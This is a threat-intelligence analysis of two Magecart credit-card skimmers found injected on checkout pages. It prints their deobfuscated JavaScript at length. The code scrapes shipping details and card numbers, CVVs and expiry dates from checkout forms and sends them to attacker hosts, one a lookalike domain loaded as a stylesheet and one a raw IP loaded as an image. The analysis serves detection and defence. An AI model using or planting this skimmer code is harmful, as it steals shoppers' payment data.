## Magecart live, again ! (not for long ?)
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [References](#References)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial vector is a JavaScript script probably injected on a legit website and reported by <a href="https://twitter.com/felixaime">felixaime</a>. As first, we can note that the algorithm for obfuscate the strings have changed.This uses the fact that the hex values or unicode values can be read as theirs representation to ASCII, that trigged the value to pull of the array.</h6>

```js
var ar=['\x74\x69\x6d\x65\x73\x74\x61\x6d\x70', [...] ,'\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'];
var tab=function(a,_0xaee9a5)
{
 a=a-0x0;
 var r=ar[a];
 return r;
};

//tab('\x30\x78\x30') -> '\x30\x78\x30' = '0x0' -> tab('0x0') -> "timestamp" 
// '\x30\x78' -> "0x" -> hex values for index of array
```

<h6>The next functions allow to parse the data on arrays, push the data found on the inputs and check if the operation has works. One of the news is the change to localStorage, like the cookie used previously, this doesn't have a limit of time but allows the anti-dev tools as debugger.</h6>

```js
function Parse_Data_Array(input,output)
{
 var i=0;
 for(let j in input)
 {
  array_tmp[output[i]]=input[j];
  i++;
 }
 return array_tmp;
}

function Push_Keys(a,b)
{
 if(Object["keys"](a)["length"]!=Object["keys"](b)["length"])return![];
 for(var obj in a) { return a[obj]["length"]>=0x1; }
 return![];
}
function Valid_Check(){return localStorage["getItem"](success_cart)!=null;}
```

<h6>The following code shows how are prepared the request in reusing the userAgent and informations of the browser opened.This format the data converted in JSON in push as Base64 the data as content of the request. The penultimate novelty is the fact that the group use keyword "let", this allows to define the visibility of the variable on the script. By this way, this hides the value to the dev-tools for debug and getting the result of the code.</h6>

```js
function prepare_header(obj)
{
 obj["ubfganzr"]=prepare_req(window['location']["hostname"]);
 obj["hfre_ntrag"]=prepare_req(navigator["userAgent"]);
 obj["hfre_vq"]=prepare_req('1');
 return obj;
}
function format_resp(argument)
{
 let res=encodeURIComponent(argument)["replace"](/%([a-f0-9]{2})/gi,(_0x1f00b5,rs)=>String["fromCharCode"](parseInt(rs,0x10)));
 return _b(res);
}
var prepare_req=index=> { return req(format_resp(index)); }
var data_storage=r=> { return _a(req(r)); }
function req(dat,resp)
{
 return++resp?String["fromCharCode"]((dat<91)>(dat=dat["charCodeAt"]()+13)?dat:dat-0x1a):dat["replace"](/[a-zA-Z]/g,req);
}
```

<h6>The last functions are the second news implemented by Magecart group, this uses the constructor method and a double of arrays for create aliases of current functions, this has just to execute this method for create the alias function by the constructor for declare it and use it.</h6>

```js
function Alias_Functions(ar,orginal_function,alias)
{
 var sub=function()
 {
  var t=!![];
  return function(c,d)
  {
   var r=t?function()
   {
    if(d)
    {
     var ret=d["apply"](c,arguments);
     d=null;
     return ret;
    }
   }:function(){};
   t=![];
   return r;
  };
 }();
 var ex=sub(this,function()
 {
  var f=function()
  {
   var r1=f["constructor"]("return /" + this + "/")()["compile"]("^([^ ]+( +[^ ]+)+)+[^ ]}");
   return!r1["test"](ex);
  };
  return f();
 });
 ex();
 ar[alias]=ar[orginal_function];
}
```
<h6>The next block of code shows the declarations of the alias in using obfuscation in spilt words on arrays, a constant was used for Upcase the first letter of the function.This content the function used for sets and clear time interval, convert Base64 to Ascii (btoa) and on the other side (atob).</h6>

```js
var time=["timestamp","out"];
var interval=["int","erase",'val'];
const FormatUpCase=tab=>
{
 if(typeof tab!=="string") return'';
 return tab["charAt"](0)["toUpperCase"]()+tab["slice"](1);
};
Alias_Functions(window,"set"+FormatUpCase(time[0]["split"]("s")[0]+time[1]),"_S"); 
// Alias_Functions(window,"setTimeout"),"_S");
Alias_Functions(window,"set"+FormatUpCase(interval[0]+interval[1]["split"]("a")[0]+interval[2]),"_A"); 
// Alias_Functions(window,"setInterval"),"_A");
Alias_Functions(window,"clear"+FormatUpCase(interval[0]+interval[1]["split"]("a")[0]+interval[2]),"_CA"); 
// Alias_Functions(window,"clearInterval"),"_CA");
Alias_Functions(window,"btoa","_b");
Alias_Functions(window,"atob","_a");
```

<h6>Once this did, this declares the arrays, variables and constant for the rest of the script.</h6>

```js
var array_ID={};
var array_Data={};
var array_tmp={};
var array_storage={};
var array_1,array_header;
const success_cart="cart_created";
```

<h6>Instead of use the common method on the ReadyState method for check that the web page are correctly loaded, this uses a check that the URL content inside "checkout" reference (reference to cybersource protection). This launch four steps, here on the first two checks in using the timer event for crawl the data while a interval of the perform event (not continue action), this defines the structure of the header of the data of the next json data.</h6>

<h6>We can note by this structure used this use "stopPropagation" method for stops the event from bubbling up the event chain and avoid to perform again the operation.Once this done, merge the data, convert to JSON and storage on the localstorage of the window of the browser.</h6>

```js
if(window["location"]["href"]["indexOf"](_a("Y2hlY2tvdXQ="))>0) //Y2hlY2tvdXQ= -> "checkout"
{
 var timer=_A(function(){_S(()=>
  {
   if(!Valid_Check()&&!!document["querySelector"]("#checkout-step-shipping"))
   {
    _CA(timer);
    array_Data={};
    array_1=["anzr",'yanzr',"nqqerff1",'pvgl',"mvc","nqqvgvbany2","cubar"];
    array_header=["firstname","lastname","street[0]","city","postcode","country_id","telephone"];
    array_header["forEach"](function(head,_index)
    {
     array_ID[_index]=document["querySelector"]("#checkout-step-shipping")["querySelector"]('[name="'+head+'"]');
     if(array_ID[_index]["value"]!='')
     {
       array_Data[_index]=prepare_req(array_ID[_index]["value"]); 
     }
     array_ID[_index]["addEventListener"]("change",function(arg)
     {
      array_Data[_index]=prepare_req(array_ID[_index]["value"]);
      arg["stopPropagation"]();
     });
    });
    var timer2=_A(()=>
    {
     if(Push_Keys(array_Data,array_header))
     {
      _CA(timer2);
      array_Data=Parse_Data_Array(array_Data,array_1);
      var data_json=JSON["stringify"](array_Data);
      localStorage["setItem"]("wc_info",data_json);
     }
    },0x12c);
   }
  },0x7d0);
 },0x12c);
   ``` 

<h6>The final code check if the last operation has done and that the cybersource solution are present on the page. If exists, this parse the data of fields of the form and add to the arrays. Once done, this convert to JSON, push in base64 the content and send a request to URL by the C2. This doesn't wait a reply, this only for sending the data to the C2 by URL requests, the group use a regex for extract all data from theirs logs of theirs C2 domains. Once performed, the script delete the informations on the localstorage as anti-forensic method.</h6>

  ```js
  var timer3=_A(function()
  {
   if(!Valid_Check()&&localStorage["getItem"]("wc_info")&&!!document["getElementById"]("cybersourcedc-transparent-form"))
   {
    _CA(timer3);
    array_Data=JSON["parse"](localStorage["getItem"]("wc_info"));
    array_storage={};
    array_1=['pp','zz','ll',"pii"];
    mathRand3=["md_cybersourcedc_cc_number","md_cybersourcedc_expiration","md_cybersourcedc_expiration_yr","md_cybersourcedc_cc_cid"];
    _S(()=>
    {
     mathRand3["forEach"](function(IDtoFind,index)
     {
      array_ID[index]=document["getElementById"](IDtoFind);
      if(array_ID[index]["value"]!=''){ array_storage[index]=prepare_req(array_ID[index]["value"]); }
      array_ID[index]["addEventListener"]("change",function(arg)
      {
       array_storage[index]=prepare_req(array_ID[index]["value"]);
       arg["stopPropagation"]();
      });
     });
    },0x7d0);
    var timer4=_A(()=>
    {
     if(Push_Keys(array_storage,mathRand3))
     {
      array_storage=Parse_Data_Array(array_storage,array_1);
      if(data_storage(array_storage['pp'])["length"]>=15&&data_storage(array_storage["pii"])["length"]>=3)
      {
       _CA(timer4);
       var infos={...array_storage,...array_Data};
       var link_obj=document["createElement"]("link");
       link_obj["href"]="https://apibazaarvoice.com/stylesheet.css?timestamp="+prepare_req(JSON["stringify"](prepare_header(infos)));
       link_obj["rel"]="stylesheet";
       link_obj["type"]="text/css";
       document["body"]["append"](link_obj);
       localStorage['setItem'](success_cart,Date["now"]()["toString"]());
       localStorage["removeItem"]('wc_info');
      }
     }
    },0x12c);
   }
  },0x3e8);
}
```

<h6>It isn't due to magecart developed skimmer for the cybersource that the group reduce theirs operations on the others ways, this only to considerate as opportunity to do additional business for the group. This version content not a tag like the others versions of magecart as code operation. This only beginning to March 2020 that the group have beginning to usurp cybersource while the attacks of NutriBullet,TrueFire and Tupperware (during COVID-19 event). The pattern used is teh same that this event too.</h6>

<h6>The second skimmer of magecart found is more like the older version with the some improvements, this still uses arrays for the obfuscation but use only integer values for getting the index and so the values. As previously explained, this use ReadyState for know if the page is correctly loaded and write cookie write the id and infos for the victim.</h6>

 ```js
var _0xb22e=["\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65", [...] ,"\x73\x72\x63"];
function docReady(timer)
{
    if(document["readyState"]=== "complete"|| document["readyState"] === "interactive"){setTimeout(timer,2000)}
    else {document["addEventListener"]("DOMContentLoaded",timer)}
}
docReady(function()
{
    String["prototype"]["hexEncode"]= function()
    {
        var id,i;
        var r="";
        for(i= 0;i< this["length"];i++)
        {
            id= this["charCodeAt"](i).toString(16);
            r+= ("000"+ id)["slice"](-4);
        }
        return r;
    }
function Push_Data(v)
{
    var c="; "+ document["cookie"];
    var res=c["split"]("; "+ v+ "=");
    if(res["length"]== 2){return res["pop"]()["split"](";")["shift"]()}
}
function Push_Cookie(v){document["cookie"]= v+ "=; expires=Thu, 01 Jan 1970 00:00:01 GMT;"}
 ```

<h6>The main function executed begins to crawl all the fields of the pages and add to the cookie the data.</h6>

 ```js
 function main()
{
 var b=document["getElementsByTagName"]("button");
 for(i= 0;i< b["length"];i++)
 {
  b[i]["addEventListener"]("click",function()
  {
    var Data="";
    var f=document["getElementsByTagName"]("form");
    document["cookie"]= "mage_stats="+ "$"+ "; path=/";
    for(z= 0;z< f["length"];z++)
    {
     var inp=f[z]["getElementsByTagName"]("input");
     var elements=f[z]["getElementsByTagName"]("select");
     for(x= 0;x< inp["length"];x++)
     {
      if(inp[x]["value"]&& inp[x]["value"]!= ""&& inp[x]["type"]!= "radio"&& inp[x]["type"]!= "hidden"&& inp[x]["id"]!= "search"&& inp[x]["value"]!= "submit")
      {
       if(inp[x]["name"]&& inp[x]["name"]!= "")
       {
         var d=Push_Data("mage_stats");
         d+= inp[x]["name"]+ ":"+ inp[x]["value"]+ "|";
         document["cookie"]= "mage_stats="+ d+ "; path=/";
       }
       else 
       {
        var d=Push_Data("mage_stats");
        d+= inp[x]["id"]+ ":"+ inp[x]["value"]+ "|";
        document["cookie"]= "mage_stats="+ d+ "; path=/";
       }
      }
     };
     for(x= 0;x< elements["length"];x++)
     {
      if(elements[x]["value"]&& elements[x]["value"]!= ""&& elements[x]["type"]!= "radio"&& elements[x]["type"]!= "hidden"&& elements[x]["id"]!= "search"&& elements[x]["value"]!= "submit")
      {
       if(elements[x]["name"]&& elements[x]["name"]!= "")
       {
        var d=Push_Data("mage_stats");
        d+= elements[x]["name"]+ ":"+ elements[x]["value"]+ "|";
        document["cookie"]= "mage_stats="+ d+ "; path=/";
       }
       else 
       {
         var d=Push_Data("mage_stats");
         d+= elements[x]["id"]+ ":"+ elements[x]["value"]+ "|";
         document["cookie"]= "mage_stats="+ d+ "; path=/";
         document["cookie"]= "mage_stats="+ d+ "; path=/";
       }
      }
     }
    };
 ```

<h6>The last part of the code is to replace the value of before send to the C2 by URL requests, this time in using the creation of an img element, by the url of the img, send the data to theirs C2 domains. This time, this doesn't remove the cookie in the cache and keep it.</h6>

```js
  Data= Push_Data("mage_stats");
  Data= Data["replace"]("card[num]","cc_number");
  Data= Data["replace"]("card[name]","cc_owner");
  Data= Data["replace"]("card[exp]","authorizenet_expiration");
  Data= Data["replace"]("payment[ccw_exp_year]","authorizenet_expiration_yr");
  Data= Data["replace"]("card[cvv]","cc_cid");
  Data= Data["replace"]("payment[ps_cc_number]","cc_number");
  Data= Data["replace"]("payment[ps_cc_owner]","cc_owner");
  Data= Data["replace"]("payment[ps_cc_exp_month]","authorizenet_expiration");
  Data= Data["replace"]("payment[ps_cc_exp_year]","authorizenet_expiration_yr");
  Data= Data["replace"]("payment[ps_cc_cid]","cc_cid");
  if(Data["indexOf"]("cc_number")!==  -1|| Data["indexOf"]("cc_cid")!==  -1|| Data["indexOf"]("cvv")!==  -1|| Data["indexOf"]("cardno")!==  -1|| Data["indexOf"]("ccNo")!==  -1|| Data["indexOf"]("securityCode")!==  -1|| Data["indexOf"]("cardNumber")!==  -1|| Data["indexOf"]("numero_cartao")!==  -1)
  {
   var result={referer:document["URL"],tag:"YTE4MWE2MDM3NjljMWY5OGFkOTI3ZTczNjdjN2FhNTE=",stats:btoa(Data["hexEncode"]())}; // YTE4MWE2MDM3NjljMWY5OGFkOTI3ZTczNjdjN2FhNTE= -> a181a603769c1f98ad927e7367c7aa51
   u= "http://45.197.141.250/analytics.php?statistics_hash="+ btoa(JSON["stringify"](result));
   var s=document["createElement"]("IMG");
   s["src"]= u;
   Push_Cookie("mage_stats");
  }
 })}
}main()})
 ```

<h6>As said before, an operation tag can be found :</h6>

<table>
<tr>
<th>Base64 tag</th>
<th>Value tag</th>
</tr><tr>
<td>YTE4MWE2MDM3NjljMWY5OGFkOTI3ZTczNjdjN2FhNTE=</td>
<td>a181a603769c1f98ad927e7367c7aa51</td>
</tr>
</table>

<h6>As a conclusion, we can note the continuity of the operations as well as the opportunity to add to their business, a skimmer against the cybersource solution (acquired by VISA) as anti-fraud solutions. It is important to note that a supposed part of the group was stopped and that it took little time to restructure and migrate to this opportunity.</h6>

<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Magecart/2020-06-02/JSON/IOC-Magecart-2020-06-02.json">JSON</a> and <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Magecart/2020-06-02/CSV/IOC-Magecart-2020-06-02.csv">CSV</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

<center>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|MITRE PRE-ATT&CK|Identify sensitive personnel information|https://attack.mitre.org/techniques/T1274|
|Collection|Input Capture|https://attack.mitre.org/techniques/T1056/|
|Credential Access|Input Capture|https://attack.mitre.org/techniques/T1056/|
|Defense Evasion|Scripting|https://attack.mitre.org/techniques/T1064/|
|Execution|Scripting|https://attack.mitre.org/techniques/T1064/|
|Command And Control|Web Service|https://attack.mitre.org/techniques/T1102/|
|Defense Evasion|Web Service|https://attack.mitre.org/techniques/T1102/|

</center>

<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Magecart/2020-06-02/JSON/MITRE-Magecart-2020-06-02.json">Export in JSON</a></h6>

<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>
<ul>
<li><a href="https://twitter.com/felixaime/status/1267095794571792384">https://twitter.com/felixaime/status/1267095794571792384</a></li>
<li><a href="https://twitter.com/felixaime/status/1267045708932222976">https://twitter.com/felixaime/status/1267045708932222976</a></li>
</ul>

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>
<ul>
<li><a href="https://app.any.run/tasks/e5cabaf3-52f6-4a21-a18c-4ef1b1432af9">bv.js</a></li>
<li><a href="https://app.any.run/tasks/30af160f-3665-4061-9744-dba451979739">jjs.js</a></li>
</ul>

<h6> References: <a name="References"></a></h6>
<ul>
<li><a href="https://developer.cybersource.com/library/documentation/dev_guides/Secure_Acceptance_Hosted_Checkout/html/Topics/Configure_Payment_Methods1.htm">Documentation secure methods - cybersource</a></li>
<li><a href="https://www.rapidspike.com/blog/ecommerce-security-nutribullet-tupperware-suffer-magecart-attacks/">Ecommerce Security – NutriBullet & Tupperware Suffer Magecart Attacks</a></li>
<li><a href="https://blog.malwarebytes.com/hacking-2/2020/03/criminals-hack-tupperware-website-with-credit-card-skimmer/">Criminals hack Tupperware website with credit card skimmer</a></li>
<li><a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/3-indonesian-hackers-arrested-for-global-magecart-attacks-other-members-still-at-large">3 Indonesian Hackers Arrested for Global Magecart Attacks, Other Members Still at Large</a></li>
</ul>
